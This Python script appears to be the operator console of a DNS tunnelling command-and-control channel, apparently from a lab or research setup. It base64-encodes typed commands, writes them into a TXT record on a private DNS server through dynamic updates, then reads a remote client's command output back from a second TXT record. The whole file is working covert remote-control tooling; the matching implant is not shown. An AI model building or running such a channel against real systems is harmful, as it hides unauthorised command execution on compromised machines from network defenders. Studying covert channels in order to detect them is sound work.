import dns.update
import dns.query
import dns.resolver
import time
import base64

# For this to work make sure the zone directory has permissions chmod 755 and chown bind:bind

# Sleep time between command and response fetch
SLEEP_TIME = 10

# DNS Zone and record names
ZONE = 'research.net.'
COMMAND_RECORD = 'covertmessage2.research.net.'
RESPONSE_RECORD = 'respond2.research.net.'

# DNS Server IP
DNS_IP = '192.168.47.101'


def update_record(new_msg: str) -> str:
    update = dns.update.Update(ZONE)
    update.delete(COMMAND_RECORD, 'TXT')
    update.add(COMMAND_RECORD, 60, 'TXT', new_msg)

    response = dns.query.tcp(update, DNS_IP)
    return response


def get_response():
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [DNS_IP]
    try:
        response = resolver.resolve(RESPONSE_RECORD, 'TXT')
        for txt_record in response:
            encoded = txt_record.to_text().strip('"')
            return base64.b64decode(encoded).decode()
    except Exception as e:
        print(f"Error fetching response: {e}")
        return None


def main():
    while True:
        command = input('Enter a command: ')
        b64_command = base64.b64encode(command.encode()).decode()
        response = update_record(b64_command)

        if "SERVFAIL" in str(response):
            print('Something went wrong :(')
            continue

        print('Command set. Waiting...')
        time.sleep(SLEEP_TIME)

        result = get_response()
        if result:
            print(f"\n--- Command Output from Client ---\n{result}\n")
        else:
            print("No response received.")

        print('Resetting covert text record...\n')
        update_record('""')


if __name__ == '__main__':
    main()
